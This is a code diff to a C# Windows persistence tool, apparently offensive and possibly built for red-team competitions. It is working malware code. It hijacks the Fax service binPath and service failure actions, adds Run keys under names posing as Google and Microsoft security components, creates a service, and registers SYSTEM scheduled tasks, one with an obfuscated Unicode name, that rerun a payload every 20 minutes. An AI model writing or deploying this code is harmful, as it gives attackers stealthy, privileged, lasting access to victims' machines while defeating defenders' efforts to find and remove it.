@@ -6,10 +6,14 @@ using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 
 
+
 namespace ezclap
 {
     class Program
     {
+        // Something to parse a yaml file and feed all the configuration into the persistence in main function 
+
+
         public static void modifyFaxService(string payload)
         {
             string arguments = "config Fax " + " binPath= \"cmd.exe /c " + payload + "\" start=\"auto\" obj=\"LocalSystem\" ";
@@ -23,42 +27,6 @@ namespace ezclap
                 string argument = "/C sc failure " + service + " reset= 10 actions= run/5000 command= \"" + payload + "\"";
                 System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
             }
-        }
-
-
-        /*
-         * Description: Create scheduled task with SYSTEM privilege, with a specific payload.
-         * 
-         * Params:
-         *  - (string) scheduledTaskName    = Name of the scheduled Task to be created 
-         *  - (string) payload              = Payload to be executed when the scheduled Task runs 
-         *  - (int)    often                = How often the scheduled task will run in an interval 
-         * 
-         */
-        public static void createScheduledTask(string scheduledTaskName, string payload, int often)
-        {
-            using (TaskService ts = new TaskService())
-            {
-                TaskDefinition td = ts.NewTask();
-                td.Principal.RunLevel = TaskRunLevel.Highest;
-                // public TaskInstancesPolicy MultipleInstances { get; set; } 
-                // Needed for creating multiple instances of the payload 
-                td.Settings.MultipleInstances = TaskInstancesPolicy.Parallel;
-                td.RegistrationInfo.Description = "Refresh Scoring Engine Workers for scoreboard";
-
-                // Add interval for Scheduled task. Default 20 minutes 
-                TimeTrigger tt = new TimeTrigger();
-                tt.Repetition.Interval = TimeSpan.FromMinutes(often);
-                td.Triggers.Add(tt);
-
-                // Path to action, Arguments, working directory 
-                td.Actions.Add(new ExecAction(payload, null, null));
-
-                // Create Scheduled Task with names and run 
-                ts.RootFolder.RegisterTaskDefinition(scheduledTaskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
-                TaskService.Instance.GetTask(scheduledTaskName).Run();
-            }
-
         }
 
         public static void modifyImageFileExec(string payload)
@@ -136,23 +104,26 @@ namespace ezclap
 
             
             // 2. Create Runkey registry with payloads 
-            string[] names = new string[] { "Application Security", "Backup", "Appsec", "Google Updates", "Microsoft Credential Guard", "duderino", "catchmeifyoucan" };
+            string[] names = new string[] { "Application Security", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
             AddRunKey persist_addrunkey = new AddRunKey(names, payload);
             
             
             // 3. Create a malicious service --> Through sc? Or actually through installer route? 
-            string unicodeServiceName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
-            string easyServiceName = "Application Security";
-            AddService uniService =  new AddService(unicodeServiceName, payload);
+            //string unicodeServiceName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
+            string easyServiceName = "ApplicationSecurity";
+            //AddService uniService =  new AddService(unicodeServiceName, payload);
             AddService easyService = new AddService(easyServiceName, payload);
+            //uniService.StartService(unicodeServiceName, 10000);
+            easyService.StartService(easyServiceName, 10000);
 
-            /*
-            // 4. Create scheduled task 
+            
+            // 4. Create scheduled task - Runs every 20 minutes 
             string scheduledTaskName = "GoogleUpdateTaskMachineMaster";
             string unicodeScheduledTaskName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
-            createScheduledTask(scheduledTaskName, payload, 20);
-            createScheduledTask(unicodeScheduledTaskName, payload, 20);
-
+            
+            AddScheduledTask task1 = new AddScheduledTask(scheduledTaskName, payload, 20.0);
+            AddScheduledTask task2 = new AddScheduledTask(unicodeScheduledTaskName, payload, 20.0);
+            /*
             // 5. Create startup folder persistence 
 
             // 6. Create utilman and sceth (sticky) persistence 
@@ -177,10 +148,8 @@ namespace ezclap
 
             modifyAccessbility();
             */
-            
-            
-            Console.ReadLine();
 
+            Console.ReadLine();
         }
     }
 }
